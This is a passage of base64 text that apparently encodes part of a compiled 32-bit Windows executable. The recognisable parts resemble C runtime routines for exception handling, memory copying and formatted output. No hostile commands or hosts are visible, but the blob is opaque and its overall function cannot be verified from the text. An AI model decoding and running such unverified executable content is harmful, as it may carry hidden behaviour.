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//g6FQAwAA/V+Lxl6LTfwzzVvo78n//8nDhdt1BYPO/+vFi4WY+///O8N1uGr+XohMH//rsov/VYvsgeyEBAAAoQQgQgAzxYlF/IN9GACLRRBTi10UiYWg+///dRjonlkAAMcAFgAAAOjRRgAAg8j/6RUBAACF23QEhcB04FZX/3UcjY18+///6PcIAACLTQiNvZD7//8zwDPSq6urq4vBi72g+///g+ACiYWM+///C8KJvZD7//+JnZT7//+JlZj7//91CoiVnPv//4X/dQfGhZz7//8B/3UgjYWQ+///iYWg+///jYWA+///UP91GI2FoPv///91DFFQjY2k+///6AcIAACDZfQAjY2k+///6HcPAACL8IX/dEuLRQgzyYPgAQvBdByF23UEhfZ1bYuFmPv//zvDdSqF9ngpO/N2JetZi4WM+///C8F0S4XbdBWF9nkEiA/rDYuFmPv//zvDdEuIDAeNjeT7///opwgAAIC9iPv//wB0DYuNfPv//4OhUAMAAP1fi8Zei038M81b6HHI///Jw4XbdQWDzv/rxYuFmPv//zvDdbhq/l6ITB//67KL/1WL7IHshAQAAKEEIEIAM8WJRfyDfRgAi0UQU4tdFImFoPv//3UY6CBYAADHABYAAADoU0UAAIPI/+kbAQAAhdt0BIXAdOBWV/91HI2NfPv//+h5BwAAi00Ijb2Q+///M8Az0qurq6uLwYu9oPv//4PgAomFjPv//wvCib2Q+///iZ2U+///iZWY+///dQqIlZz7//+F/3UHxoWc+///Af91II2FkPv//4mFoPv//42FgPv//1D/dRiNhaD7////dQxRUI2NpPv//+jFBgAAg2X0AI2NpPv//+gpEAAAi/CF/3RRi0UIg+ABg8gAdByF23UEhfZ1dIuFmPv//zvDdS6F9ngwO/N2LOtgi4WM+///g8gAdFGF23QbhfZ5BzPAZokH6xCLhZj7//87w3ROM8lmiQxHjY3k+///6CMHAACAvYj7//8AdA2LjXz7//+DoVADAAD9X4vGXotN/DPNW+jtxv//ycOF23UFg87/68WLhZj7//87w3W1av5eM8BmiURf/uuvi/9Vi+yDfRgAdRXotlYAAMcAFgAAAOjpQwAAg8j/XcNWi3UQhfZ0OoN9FAB2NP91IP91HP91GP91FFb/dQz/dQjoN/v//4PEHIXAeQPGBgCD+P51IOhsVgAAxwAiAAAA6wvoX1YAAMcAFgAAAOiSQwAAg8j/Xl3Dg7kEBAAAAHUGuAACAADDi4EABAAA0ejDg7kEBAAAAHUGuAABAADDi4EABAAAwegCw4v/VYvsUVaLdQhXi/mB/v///392D+gDVgAAxwAMAAAAMsDrU1Mz2wP2OZ8EBAAAdQiB/gAEAAB2CDu3AAQAAHcEsAHrMVboXmAAAIlF/FmFwHQajUX8UI2PBAQAAOjsBQAAi0X8swGJtwAEAABQ6BpWAABZisNbX17JwgQAi/9Vi+xRVot1CFeL+YH+////P3YP6IZVAADHAAwAAAAywOtUUzPbweYCOZ8EBAAAdQiB/gAEAAB2CDu3AAQAAHcEsAHrMVbo4F8AAIlF/FmFwHQajUX8UI2PBAQAAOhuBQAAi0X8swGJtwAEAABQ6JxVAABZisNbX17JwgQAi/9Vi+yLRRRIg+gBdB+D6AF0FoPoCXQRg30UDXQPikUQPGN0CDxzdASwAV3DMsBdw4v/VYvsi0UUSIPoAXQ8g+gBdDOD6Al0LoN9FA10KItFCIPgBIPIAGoBWHQEisjrAjLJZoN9EGN0B2aDfRBzdQIywDLBXcOwAV3DMsBdw4v/VovxV4u+BAQAAOhE/v//hf91BAPG6wIDx19ew4v/VYvsU1aL8VeNTkCLuQQEAACF/3UCi/noGf7//4tdCEgD+Il+NIvPi1YohdJ/BIXbdDCNSv+LwzPSiU4o93UMgMIwi9iA+jl+DIpFEDQBwOAFBAcC0ItGNIgQ/040i04068Ur+Yl+OP9GNF9eW13CDACL/1WL7FNWi/FXjU5Ai7kEBAAAhf91Aov56L79//+LXQiNPEeDx/6JfjSLz4tWKIXSfwSF23Q+jUr/i8Mz0olOKPd1DIvYjUIwD7fIg/k5dhGKRRA0AcDgBQQHAsFmmA+3yItGNGYPvslmiQiDRjT+i04067cr+dH/iX44g0Y0Al9eW13CDACL/1WL7IPsDFNWi/FXjU5Ai7kEBAAAhf91Aov56Bz9//+LXQxIA/iJffyLz4l+NIt9CItWKIXSfwaLxwvDdD1TagD/dRCNQv9TV4lGKOhtBAEAiV34W5CAwTCL+IvagPk5fgyKRRQ0AcDgBQQHAsiLRjSICP9ONItONOu2i338K/mJfjj/RjRfXlvJwhAAi/9Vi+yD7AxTVovxV41OQIu5BAQAAIX/dQKL+eim/P//i10MjTxHg8f+iX38i8+JfjSLfQiLViiF0n8Gi8cLw3RLU2oA/3UQjUL/U1eJRijo3AMBAIld+FuQg8Ewi/gPt8mL2oP5OXYRikUUNAHA4AUEBwLBZpgPt8iLRjRmD77JZokIg0Y0/otONOuoi338K/nR/4l+OINGNAJfXlvJwhAAi/9Vi+xWM/Y5dRB+K1eLfRT/dQyLTQjo8ygAAITAdAb/B4sH6waDD/+DyP+D+P90BkY7dRB82l9eXcOL/1WL7FYz9jl1EH4wU2YPvl0MV4t9FItNCFPo6igAAITAdAb/B4sH6waDD/+DyP+D+P90BkY7dRB83F9bXl3Di/9Vi+xWM/Y5dRB+HFeLfRSLTQhX/3UM6PAnAACDP/90BkY7dRB86V9eXcOL/1WL7FYz9jl1EH4hU2YPvl0MV4t9FItNCFdT6AIoAACDP/90BkY7dRB8619bXl3Di/9Vi+xRM8CJTfyJAYlBBIlBCIlBDIlBEIlBFIlBGIlBHIlBIIlBJIlBKGaJQTCJQTiIQTyJgUAEAACJgUQEAACLwcnDi/9Vi+xRM9KJTfyJETPAiVEEiVEIiVEMZolBMovBiVEQiVEUiVEYiVEciVEgiVEkiVEoiFEwiVE4iFE8iZFABAAAiZFEBAAAycOL/1WL7FaL8ehk////i0UIiwCJhkgEAACLRQyJBotFEIlGBItFGIlGCItFFIlGEItFHIlGFIvGXl3CGACL/1WL7FaL8eht////i0UIiwCJhkgEAACLRQyJBotFEIlGBItFGIlGCItFFIlGEItFHIlGFIvGXl3CGACL/1WL7FNXi/mLTQjGRwwAjV8Ehcl0CYsBiQOLQQTrFYM95DBCAAB1EaHwIUIAiQOh9CFCAIlDBOtBVuhpZAAAiQeNdwhTUItITIkLi0hIiQ7opWYAAFb/N+jKZgAAiw+DxBCLgVADAABeqAJ1DYPIAomBUAMAAMZHDAGLx19bXcIEAIB5DAB0CYsBg6BQAwAA/cOL/1aL8f+2BAQAAOhJUAAAg6YEBAAAAFlew4v/VYvsVovx/zboMFAAAItVCIMmAFmLAokGi8aDIgBeXcIEAIv/VYvsgex0BAAAoQQgQgAzxYlF/FaL8VeLBos4V+hpcwAAiIWc+///i0YEWY2NjPv///8w6PX+//+LBo2NpPv//4sAiYWg+///i0YQ/zCNhZD7//9Qi0YM/zCLRgj/cAT/MI2FoPv//1DoSP7//4Nl9ACNjaT7///ogAMAAI2N5Pv//4vw6Df///+AvZj7//8AdA2LjYz7//+DoVADAAD9V/+1nPv//+iLcwAAWVmLTfyLxl8zzV7o9L7//8nDi/9Vi+yB7HQEAAChBCBCADPFiUX8VovxV4sGizhX6KpyAACIhZz7//+LRgRZjY2M+////zDoNv7//4sGjY2k+///iwCJhaD7//+LRhD/MI2FkPv//1CLRgz/MItGCP9wBP8wjYWg+///UOjF/f//g2X0AI2NpPv//+gNBgAAjY3k+///i/DoeP7//4C9mPv//wB0DYuNjPv//4OhUAMAAP1X/7Wc+///6MxyAABZWYtN/IvGXzPNXug1vv//ycPMi/9Vi+yLRQxTiwCLgIgAAACLAIoYi0UIigiEyXQSitGKyjrTdAqKSAFAitGEyXXwQITJdEmKCITJdBfrA41JAID5ZXQNgPlFdAiKSAFAhMl17opI/4vQSID5MHUMjUkAikj/SID5MHT3Ost1A0iL/4oKjUABiAiNUgGEyXXyW13Di/9Vi+yKTQiNQeA8WncSD77Bg+ggg+B/iwzF1JlBAOsCM8mLRQyNBMiD4H+LBMXQmUEAXcIIAIv/VYvsik0IjUHgPFp3Eg++wYPoIIPgf4sExdSdQQDrAjPAa8AJA0UMg+B/iwTF0J1BAF3CCACL/1WL7ItNCI1B4GaD+Fp3D41B4IPgf4sMxdSZQQDrAjPJi0UMjQTIg+B/iwTF0JlBAF3CCADMzMzMzMzMzMzMzIv/VYvsi0UMU1ZXizCLRQiLvpQAAACKGA+2y4A8OWV0D4sWilgBQA+2y/YESgR18w+2y4A8OXh1BopYAoPAAouOiAAAAIsJigmICECNZCQAigiNQAGK04hY/4rZhNJ18F9eW13Di/9Vi+xRU1ZXi/mLdwyF9nUK6IBMAACL8Il3DIsejU38gyYAi0cQg2X8AEhqClFQ6FdXAACLTQiDxAyJAYtHDIXAdQjoTkwAAIlHDIM4InQPi0X8O0cQcgeJRxCwAesCMsCDPgB1BoXbdAKJHl9eW8nCBACL/1WL7FFTVleL+Yt3DIX2dQroDEwAAIvwiXcMix6NTfyDJgCLRxCDZfwAg+gCagpRUOgLVwAAi00Ig8QMiQGLRwyFwHUI6NhLAACJRwyDOCJ0D4tF/DtHEHIHiUcQsAHrAjLAgz4AdQaF23QCiR5fXlvJwgQAi/9TVovxjY5IBAAA6OQgAACEwHQbM9s5XhAPhbkAAADoiEsAAMcAFgAAAOi7OAAAg8j/XlvDiV44iV4c6YUAAAD/RhA5XhgPjIwAAAD/dhwPtkYxi85Q6Kb9//+JRhyD+Ah0vIP4B3fH/ySFc3hAAIvO6IcFAADrRYNOKP+JXiSIXjCJXiCJXiyIXjzrOIvO6O8EAADrJ4vO6E0WAADrHoleKOshi87oSAcAAOsQi87ojAcAAOsHi87oDw0AAITAD4Rq////i0YQigCIRjGEwA+Fa/////9GEP+GUAQAAIO+UAQAAAIPhUr///+LRhjpP////+93QAD4d0AADXhAABZ4QAAfeEAAJHhAAC14QAA2eEAAi/9TVovxjY5IBAAA6PEfAACEwHQbM9s5XhAPhcgAAADodEoAAMcAFgAAAOinNwAAg8j/XlvDiV44iV4c6YUAAAD/RhA5XhgPjIwAAAD/dhwPtkYxi85Q6Mn8//+JRhyD+Ah0vIP4B3fH/ySFl3lAAIvO6JIEAADrRYNOKP+JXiSIXjCJXiCJXiyIXjzrOIvO6NsDAADrJ4vO6DkVAADrHoleKOshi87oNAYAAOsQi87oxgcAAOsHi87oLQ4AAITAD4Rq////i0YQigCIRjGEwA+Fa/////9GEIvO6D0fAACEwA+ESP////+GUAQAAIO+UAQAAAIPhTv///+LRhjpMP///5ADeUAADHlAACF5QAAqeUAAM3lAADh5QABBeUAASnlAAIv/U1aL8Y2OSAQAAOjNHgAAhMB0GzPbOV4QD4W5AAAA6FBJAADHABYAAADogzYAAIPI/15bw4leOIleHOmFAAAA/0YQOV4YD4yMAAAA/3YcD7ZGMYvOUOhu+///iUYcg/gIdLyD+Ad3x/8khat6QACLzuhuAwAA60WDTij/iV4kiF4wiV4giV4siF486ziLzui3AgAA6yeLzugVFAAA6x6JXijrIYvO6BAFAADrEIvO6KIGAADrB4vO6AkNAACEwA+Eav///4tGEIoAiEYxhMAPhWv/////RhD/hlAEAACDvlAEAAACD4VK////i0YY6T////8nekAAMHpAAEV6QABOekAAV3pAAFx6QABlekAAbnpAAIv/U1aL8Y2OSAQAAOi5HQAAhMB0GzPbOV4QD4W+AAAA6DxIAADHABYAAADobzUAAIPI/15bw4leOIleHOmGAAAAg0YQAjleGA+MkAAAAP92HA+3RjKLzlDox/r//4lGHIP4CHS7g/gHd8b/JIXHe0AAi87oeAIAAOtFg04o/4leJIheMIleIIleLIhePOs4i87o3wEAAOsni87oKxMAAOseiV4o6yGLzughBAAA6xCLzujbBgAA6weLzugmDgAAhMAPhGn///+LRhAPtwBmiUYyZoXAD4Vn////g0YQAv+GUAQAAIO+UAQAAAIPhUX///+LRhjpOv///41JADx7QABFe0AAWntAAGN7QABse0AAcXtAAHp7QACDe0AAi/9TVovxjY5IBAAA6J0cAACEwHQbM9s5XhAPhb4AAADoIEcAAMcAFgAAAOhTNAAAg8j/XlvDiV44iV4c6YYAAACDRhACOV4YD4yQAAAA/3YcD7dGMovOUOir+f//iUYcg/gIdLuD+Ad3xv8kheN8QACLzuh7AQAA60WDTij/iV4kiF4wiV4giV4siF486ziLzujDAAAA6yeLzugPEgAA6x6JXijrIYvO6AUDAADrEIvO6DcHAADrB4vO6GcPAACEwA+Eaf///4tGEA+3AGaJRjJmhcAPhWf///+DRhAC/4ZQBAAAg75QBAAAAg+FRf///4tGGOk6////jUkAWHxAAGF8QAB2fEAAf3xAAIh8QACNfEAAlnxAAJ98QAAPvkExg+ggdC2D6AN0IoPoCHQXSIPoAXQLg+gDdRyDSSAI6xaDSSAE6xCDSSAB6wqDSSAg6wSDSSACsAHDD7dBMoPoIHQtg+gDdCKD6Ah0F0iD6AF0C4PoA3Ucg0kgCOsWg0kgBOsQg0kgAesKg0kgIOsEg0kgArABw+h3AAAAhMB1E+ihRQAAxwAWAAAA6NQyAAAywMOwAcPokgAAAITAdRPogkUAAMcAFgAAAOi1MgAAMsDDsAHD6J0AAACEwHUT6GNFAADHABYAAADoljIAADLAw7ABw+ioAAAAhMB1E+hERQAAxwAWAAAA6HcyAAAywMOwAcOL/1WL7FFWagCL8eiZAAAAhMB0I4pGMY2OSAQAAIhF/P91/Oi/GwAAhMB0Bf9GGOsEg04Y/7ABXsnDi/9WagCL8ejQAAAAhMB1Al7DjUYYUA+2RjGNjkgEAABQ6AAbAACwAV7Di/9Wi/EPt0YyjY5IBAAAUMZGPAHooBsAAITAdAX/RhjrBINOGP+wAV7DjVEYxkE8AVIPt1EygcFIBAAAUuj8GgAAsAHDi/9TVovxaACAAACKXjEPvsNQi0YIxkY8AIsA/zDoXiAAAIPEDIXAdD1TjY5IBAAA6AkbAACEwHQF/0YY6wSDThj/i0YQighAiE4xiUYQhMl1FOgzRAAAxwAWAAAA6GYxAAAywOsCsAFeW8IEAIv/U1aL8WgAgAAAil4xD77DUItGCMZGPACLAP8w6PEfAACDxAyFwHQ0jUYYUFONjkgEAADoERoAAItGEIoIQIhOMYlGEITJdRToz0MAAMcAFgAAAOgCMQAAMsDrArABXlvCBACAeTEqjVEodAdS6BP3///Dg0EUBItBFItA/IkChcB5A4MK/7ABw2aDeTIqjVEodAdS6GD3///Dg0EUBItBFItA/IkChcB5A4MK/7ABw4pBMTxGdRqLAYPgCIPIAA+FNgEAAMdBHAcAAADpawUAADxOdSaLAWoIWiPCg8gAD4UWAQAAiVEc6C9DAADHABYAAADoYjAAADLAw4N5LAB15zxqD4+xAAAAD4SiAAAAPEl0QzxMdDM8VHQjPGgPhdgAAACLQRCAOGh1DECJQRAzwEDpwQAAAGoC6bkAAADHQSwNAAAA6bEAAADHQSwIAAAA6aUAAACLURCKAjwzdRiAegEydRKNQgLHQSwKAAAAiUEQ6YQAAAA8NnUVgHoBNHUPjUICx0EsCwAAAIlBEOtrPGR0FDxpdBA8b3QMPHV0CDx4dAQ8WHVTx0EsCQAAAOtKx0EsBQAAAOtBPGx0Jzx0dBo8d3QNPHp1McdBLAYAAADrKMdBLAwAAADrH8dBLAcAAADrFotBEIA4bHUIQIlBEGoE6wJqA1iJQSywAcOKQTE8RnUaiwGD4AiDyAAPhTYBAADHQRwHAAAA6U8GAAA8TnUmiwFqCFojwoPIAA+FFgEAAIlRHOjhQQAAxwAWAAAA6BQvAAAywMODeSwAdec8ag+PsQAAAA+EogAAADxJdEM8THQzPFR0IzxoD4XYAAAAi0EQgDhodQxAiUEQM8BA6cEAAABqAum5AAAAx0EsDQAAAOmxAAAAx0EsCAAAAOmlAAAAi1EQigI8M3UYgHoBMnUSjUICx0EsCgAAAIlBEOmEAAAAPDZ1FYB6ATR1D41CAsdBLAsAAACJQRDrazxkdBQ8aXQQPG90DDx1dAg8eHQEPFh1U8dBLAkAAADrSsdBLAUAAADrQTxsdCc8dHQaPHd0DTx6dTHHQSwGAAAA6yjHQSwMAAAA6x/HQSwHAAAA6xaLQRCAOGx1CECJQRBqBOsCagNYiUEssAHDD7dRMovCVoP6RnUbiwGD4AiDyAAPhVoBAADHQRwHAAAAXuktBwAAg/pOdSeLAWoIWiPCg8gAD4U4AQAAiVEc6IxAAADHABYAAADovy0AADLAXsODeSwAdeZqal5mO8YPh8UAAAAPhLYAAACD+El0S4P4THQ6g/hUdClqaFpmO8IPhe4AAACLQRBmORB1DoPAAolBEDPAQOnVAAAAagLpzQAAAMdBLA0AAADpx